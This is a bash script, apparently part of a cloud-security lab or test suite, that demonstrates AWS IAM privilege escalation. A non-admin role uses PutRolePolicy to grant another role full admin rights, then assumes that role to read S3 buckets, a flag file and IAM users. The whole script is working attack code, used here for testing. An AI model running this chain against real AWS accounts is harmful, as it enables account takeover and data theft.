#!/bin/bash

# Demo script for PutRolePolicy privilege escalation attack
# This script demonstrates how RoleA can add admin policy to RoleB then assume it

set -e  # Exit on any error

# Configuration
PROFILE="pl-pathfinder-starting-user-prod"
REGION="us-west-2"

# Disable paging for AWS CLI
export AWS_PAGER=""

# Get the account ID from the profile
echo "🔍 Getting account ID from profile: $PROFILE"
ACCOUNT_ID=$(aws sts get-caller-identity --profile $PROFILE --query Account --output text)
echo "📋 Account ID: $ACCOUNT_ID"

# Role ARNs
ROLE_A_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-role-a-non-admin"
ROLE_B_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-role-b-admin"

echo ""
echo "🎯 Starting PutRolePolicy privilege escalation attack..."
echo "======================================================"

# Step 1: Assume RoleA (non-admin role)
echo ""
echo "🔄 Step 1: Assuming RoleA (non-admin role)..."
echo "Role ARN: $ROLE_A_ARN"

ROLE_A_CREDENTIALS=$(aws sts assume-role \
    --profile $PROFILE \
    --role-arn $ROLE_A_ARN \
    --role-session-name "attack-role-a" \
    --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
    --output text)

ROLE_A_ACCESS_KEY=$(echo $ROLE_A_CREDENTIALS | cut -d' ' -f1)
ROLE_A_SECRET_KEY=$(echo $ROLE_A_CREDENTIALS | cut -d' ' -f2)
ROLE_A_SESSION_TOKEN=$(echo $ROLE_A_CREDENTIALS | cut -d' ' -f3)

echo "✅ Successfully assumed RoleA"

# Step 2: Use RoleA to modify RoleB's policies (privilege escalation)
echo ""
echo "🔄 Step 2: Using RoleA to add admin policy to RoleB..."
echo "This is the privilege escalation step! RoleB starts with no policies."

# Create a malicious policy that gives RoleB even more admin access
MALICIOUS_POLICY='{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}'

echo "📝 Adding malicious policy to RoleB..."

AWS_ACCESS_KEY_ID=$ROLE_A_ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$ROLE_A_SECRET_KEY \
    AWS_SESSION_TOKEN=$ROLE_A_SESSION_TOKEN \
    aws iam put-role-policy \
    --role-name pl-prod-role-b-admin \
    --policy-name malicious-admin-policy \
    --policy-document "$MALICIOUS_POLICY" \
    --region $REGION

echo "✅ Successfully modified RoleB's policies!"

# Step 3: Assume RoleB (now with enhanced admin permissions)
echo ""
echo "🔄 Step 3: Assuming RoleB (now with enhanced admin permissions)..."
echo "Role ARN: $ROLE_B_ARN"

ROLE_B_CREDENTIALS=$(AWS_ACCESS_KEY_ID=$ROLE_A_ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$ROLE_A_SECRET_KEY \
    AWS_SESSION_TOKEN=$ROLE_A_SESSION_TOKEN \
    aws sts assume-role \
    --region $REGION \
    --role-arn $ROLE_B_ARN \
    --role-session-name "attack-role-b-admin" \
    --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
    --output text)

ROLE_B_ACCESS_KEY=$(echo $ROLE_B_CREDENTIALS | cut -d' ' -f1)
ROLE_B_SECRET_KEY=$(echo $ROLE_B_CREDENTIALS | cut -d' ' -f2)
ROLE_B_SESSION_TOKEN=$(echo $ROLE_B_CREDENTIALS | cut -d' ' -f3)

echo "✅ Successfully assumed RoleB with admin permissions!"

echo "Waiting 10 seconds..."
sleep 10

# Step 4: Demonstrate admin access by listing S3 buckets
echo ""
echo "🔄 Step 4: Demonstrating admin access by listing S3 buckets..."

AWS_ACCESS_KEY_ID=$ROLE_B_ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$ROLE_B_SECRET_KEY \
    AWS_SESSION_TOKEN=$ROLE_B_SESSION_TOKEN \
    aws s3 ls --region $REGION

# Step 5: Access the admin demo bucket
echo ""
echo "🔄 Step 5: Accessing the admin demo bucket..."

# Get the actual bucket name by listing S3 buckets and finding the one with our prefix
BUCKET_NAME=$(AWS_ACCESS_KEY_ID=$ROLE_B_ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$ROLE_B_SECRET_KEY \
    AWS_SESSION_TOKEN=$ROLE_B_SESSION_TOKEN \
    aws s3 ls | grep "pl-prod-admin-demo-bucket-" | awk '{print $3}' | head -1)

# List contents of the admin demo bucket
echo "📦 Listing contents of admin demo bucket: $BUCKET_NAME"

AWS_ACCESS_KEY_ID=$ROLE_B_ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$ROLE_B_SECRET_KEY \
    AWS_SESSION_TOKEN=$ROLE_B_SESSION_TOKEN \
    aws s3 ls s3://$BUCKET_NAME/ --region $REGION

# Download and display the admin flag file
echo ""
echo "🔄 Step 6: Downloading and displaying admin flag file..."

AWS_ACCESS_KEY_ID=$ROLE_B_ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$ROLE_B_SECRET_KEY \
    AWS_SESSION_TOKEN=$ROLE_B_SESSION_TOKEN \
    aws s3 cp s3://$BUCKET_NAME/admin-flag.txt /tmp/admin-flag.txt --region $REGION

echo ""
echo "📄 Admin flag file contents:"
echo "============================="
cat /tmp/admin-flag.txt
echo "============================="

# Clean up the temporary file
rm -f /tmp/admin-flag.txt

# Step 7: Demonstrate additional admin capabilities
echo ""
echo "🔄 Step 7: Demonstrating additional admin capabilities..."

# List IAM users (admin permission)
echo "👥 Listing IAM users (admin permission):"
AWS_ACCESS_KEY_ID=$ROLE_B_ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$ROLE_B_SECRET_KEY \
    AWS_SESSION_TOKEN=$ROLE_B_SESSION_TOKEN \
    AWS_PAGER="" aws iam list-users --query 'Users[].UserName' --output table --region $REGION

echo ""
echo "🎉 SUCCESS! Successfully exploited PutRolePolicy privilege escalation!"
echo "===================================================================="
echo "📊 Attack Summary:"
echo "   - Started with profile: $PROFILE"
echo "   - Assumed RoleA (non-admin): $ROLE_A_ARN"
echo "   - Modified RoleB's policies using iam:PutRolePolicy"
echo "   - Assumed RoleB (now with admin permissions): $ROLE_B_ARN"
echo "   - Gained full administrative access to AWS account"
echo "   - Accessed admin demo bucket: $BUCKET_NAME"
echo "   - Downloaded and displayed admin flag file"
echo "   - Demonstrated additional admin capabilities"
echo ""
echo "💡 This demonstrates a critical privilege escalation attack!"
echo "   An attacker with limited iam:PutRolePolicy permissions can gain"
echo "   full administrative access by modifying trusted admin roles."

# Clean up environment variables
unset ROLE_A_ACCESS_KEY ROLE_A_SECRET_KEY ROLE_A_SESSION_TOKEN

# Standardized test results output
echo "TEST_RESULT:prod_role_has_putrolepolicy_on_non_admin_role:SUCCESS"
echo "TEST_DETAILS:prod_role_has_putrolepolicy_on_non_admin_role:Successfully demonstrated cross-role privilege escalation using PutRolePolicy"
echo "TEST_METRICS:prod_role_has_putrolepolicy_on_non_admin_role:cross_role_policy_attached=true,admin_access_gained=true"
unset ROLE_B_ACCESS_KEY ROLE_B_SECRET_KEY ROLE_B_SESSION_TOKEN
